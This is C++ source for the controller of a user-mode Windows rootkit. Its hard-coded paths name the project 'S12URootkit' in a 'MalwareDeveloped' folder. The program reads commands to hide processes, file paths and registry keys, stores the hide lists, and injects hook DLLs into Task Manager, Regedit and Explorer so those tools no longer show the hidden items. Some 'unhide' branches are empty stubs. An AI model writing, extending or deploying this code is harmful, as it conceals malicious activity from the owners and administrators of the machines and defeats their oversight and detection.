#include <iostream>
#include <Windows.h>
#include <vector>
#include <WbemIdl.h>
#include <comutil.h>
#include <AccCtrl.h>
#include <Aclapi.h> 
#include <string>
#include <unordered_map>
#include "IPCObjects.h"
#include "multiDLLInjector.h"
#include "newProcessMonitor.h"

using namespace std;

#define PROCESS_DLL "S:\\MalwareDeveloped\\S12URootkit\\processHooks\\x64\\Release\\processHooks.dll"
#define PROCESS_DLL_W L"S:\\MalwareDeveloped\\S12URootkit\\processHooks\\x64\\Release\\processHooks.dll"
#define PATH_DLL "S:\\MalwareDeveloped\\S12URootkit\\fileHooks\\x64\\Release\\fileHooks.dll"
#define REGISTER_DLL "S:\\MalwareDeveloped\\S12URootkit\\registryHooks\\x64\\Release\\registryHooks.dll"


int main(int argc, char* argv[]){        
    unordered_map<string, vector<string>> injectionMap;
    Serialitzator serialitzator("");

    // Process
    vector<wchar_t*> processesToHide;    
    wstring str1 = L"UserMode-Rootkit.exe";
    processesToHide.push_back((wchar_t*)str1.c_str());

    // Path
    vector<wstring> pathsToHide;
    wstring str2 = L"C:\\Users\\Public\\Music";
    pathsToHide.push_back(str2);

    // Registry
    vector<wstring> registryKeysToHide;
    wstring str3 = L"hide";
    registryKeysToHide.push_back(str3);

    serialitzator.serializeVectorWCharTPointer(processesToHide, L"processAgentMapped");
    serialitzator.serializeVectorWString(pathsToHide, L"pathMapped");
    serialitzator.serializeVectorWString(registryKeysToHide, L"registryMapped");

    // - rootkit.exe process hide processname.exe
    if (argc == 4 && strcmp(argv[1], "process") == 0 && strcmp(argv[2], "hide") == 0) {
		char* processName = argv[3];
        vector<wchar_t*> deserializedStrings = serialitzator.deserializeWCharTPointerVector(L"processAgentMapped");
        wstring processNameW(processName, processName + strlen(processName));
        deserializedStrings.push_back(&processNameW[0]);
        serialitzator.serializeVectorWCharTPointer(deserializedStrings, L"agentMapped");
        injectionMap["Taskmgr.exe"] = { PROCESS_DLL };
        injectDlls(injectionMap);
        newProcessListener();
	}
     
    // - rootkit.exe process unhide processname.exe
    if (argc == 4 && strcmp(argv[1], "process") == 0 && strcmp(argv[2], "unhide") == 0) {
        char* processName = argv[3];
        vector<wchar_t*> deserializedStrings = serialitzator.deserializeWCharTPointerVector(L"agentMapped");
        wstring processNameW(processName, processName + strlen(processName));
        for (auto it = deserializedStrings.begin(); it != deserializedStrings.end(); ++it) {
            if (wcscmp(*it, &processNameW[0]) == 0) {
				deserializedStrings.erase(it);
				break;
			}
		}
        serialitzator.serializeVectorWCharTPointer(deserializedStrings, L"agentMapped");
        injectionMap["Taskmgr.exe"] = { PROCESS_DLL };
        injectDlls(injectionMap);
        newProcessListener();
    }

    if (argc == 4 && strcmp(argv[1], "path") == 0 && strcmp(argv[2], "hide") == 0){
		// - rootkit.exe file hide filename.exe
        vector<wstring> deserializedStrings = serialitzator.deserializeWStringVector(L"pathMapped");

        // convert char* to wstring
        char* path = argv[3];
        wstring pathW(path, path + strlen(path));
        deserializedStrings.push_back(pathW);
        serialitzator.serializeVectorWString(deserializedStrings, L"pathMapped");
	}

    if (argc == 4 && strcmp(argv[1], "path") == 0 && strcmp(argv[2], "unhide") == 0) {
        // - rootkit.exe file unhide filename.exe
    }

    // - rootkit.exe registry hide keyname
    if (argc == 4 && strcmp(argv[1], "registry") == 0 && strcmp(argv[2], "hide") == 0) {
		// - rootkit.exe registry hide keyname
        vector<wstring> deserializedStrings = serialitzator.deserializeWStringVector(L"registryMapped");
		char* key = argv[3];
		wstring keyW(key, key + strlen(key));
		deserializedStrings.push_back(keyW);
		serialitzator.serializeVectorWString(deserializedStrings, L"registryMapped");
		injectionMap["regedit.exe"] = { REGISTER_DLL };
        injectDlls(injectionMap);
        newProcessListener();
    }

    // - rootkit.exe registry unhide keyname
    if (argc == 4 && strcmp(argv[1], "registry") == 0 && strcmp(argv[2], "unhide") == 0) {
		// - rootkit.exe registry unhide keyname
	}

    injectionMap["explorer.exe"] = { PATH_DLL };
    injectDlls(injectionMap);
    getchar();
}


